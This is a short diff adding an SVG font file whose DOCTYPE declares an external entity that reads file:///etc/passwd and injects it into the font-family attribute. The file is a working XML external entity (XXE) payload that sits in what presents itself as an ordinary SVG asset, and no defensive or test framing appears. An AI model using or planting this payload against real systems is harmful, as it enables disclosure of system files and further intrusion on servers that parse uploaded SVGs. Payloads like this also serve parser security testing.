@@ -1,0 +1,4 @@
+<?xml version="1.0"?>
+<!DOCTYPE svg [ <!ENTITY x SYSTEM "file:///etc/passwd"> ]>
+<svg xmlns="http://www.w3.org/2000/svg"><defs><font><font-face font-family="&x;"/>
+<glyph unicode="I" d="M 0 0 V 700"/></font></defs></svg>
